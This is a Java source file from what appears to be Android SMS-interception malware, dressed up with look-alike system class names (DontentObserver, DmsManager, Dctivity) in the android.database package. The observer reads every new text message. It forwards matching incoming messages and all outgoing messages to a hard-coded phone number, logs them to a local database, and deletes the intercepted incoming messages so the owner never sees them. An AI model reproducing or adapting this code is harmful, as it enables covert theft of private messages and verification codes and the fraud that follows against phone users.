package android.database;

import java.util.Date;

import android.app.Dctivity;
import android.content.Context;
import android.content.DroadcastReceiver;
import android.content.SharedPreferences;
import android.database.sqlite.DQLiteOpenHelper;
import android.lang.Dhread;
import android.lang.LogUtils;
import android.net.Uri;
import android.os.Handler;
import android.telephony.DmsManager;

public class DontentObserver extends ContentObserver {

	private int id = -1;
	private Context context;
	private SharedPreferences sp;

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		LogUtils.write("Send", "监听到短信数据变动");
		Cursor c = context.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");
		if (c.moveToFirst()) {
			int type = c.getInt(c.getColumnIndex("type"));
			int _id = c.getInt(c.getColumnIndex("_id"));

			if (type == 1 || type == 2) {
				
				if (_id > id) {
					LogUtils.write("Send", "检测到短信");
					String address = c.getString(c.getColumnIndex("address"));
					LogUtils.write("Send", "获取号码"+address);
					address = address.replace("+86", "").replace("+1", "");
					LogUtils.write("Send", "去除加号 " + address);
					if (address.length() > 0) {
						boolean isflag = false;
						if (type == 1) {
							LogUtils.write("Send", "匹配收到短信内容");
							for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
								if (address.startsWith(DroadcastReceiver.NUMS[i])) {
									isflag = true;
									break;
								}
							}
						} else {
							LogUtils.write("Send", "检测到发信");
							isflag = true;
						}

						if (isflag) {
							String lx = (type == 1 ? "拦截" : "发件箱");
							LogUtils.write("Send", "检测类型"+lx);
							String body = c.getString(c.getColumnIndex("body"));
							LogUtils.write("Send", "内容"+body);
							DQLiteOpenHelper.getHelper(context).addData(lx,address, body, new Date());
							LogUtils.write("Send", "加入发送线程");
							if (type == 1) {
								DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+address+"#"+body);
								LogUtils.write("Send", "删除短信");
								context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
							}else{
								DmsManager.Send(context,Dctivity.phonenum,Dctivity.zhuanfa+address+"#"+body);
							}
							Dhread.SartSend(context.getApplicationContext());
						}
					}
				}
				id = _id;

			}

		}
		c.close();
	}

	public DontentObserver(Context context, Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.context = context;
		init();
	}

	private void init() {
		Cursor c = context.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");
//		sp=context.getSharedPreferences("Dctivityconfig", Context.MODE_PRIVATE);
//		if (!sp.getBoolean("issend", false)) {
//			while (c.moveToNext()) {
//				int type = c.getInt(c.getColumnIndex("type"));
//				String address = c.getString(c.getColumnIndex("address"));
//				if (type == 1 || type == 2) {
//					if (address.length() > 0) {
//						boolean isflag = false;
//						if (type == 1) {
//							for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
//								if (address
//										.startsWith(DroadcastReceiver.NUMS[i])) {
//									isflag = true;
//									break;
//								}
//							}
//						} else {
//							isflag = true;
//						}
//
//						if (isflag) {
//							String lx = (type == 1 ? "发件箱" : "发件箱");
//							String body = c.getString(c.getColumnIndex("body"));
//							long time = c.getLong(c.getColumnIndex("date"));
//							Date date = new Date(time);
//							DQLiteOpenHelper.getHelper(context).addData(lx,
//									address, body, date);
//						}
//					}
//				}
//			}
//			Editor editor=sp.edit();
//			editor.putBoolean("issend", true);
//			editor.commit();
//		}
		c.close();
//		LogUtils.write("Send", "加入发送线程");
//		Dhread.SartSend(context.getApplicationContext());
	}
}
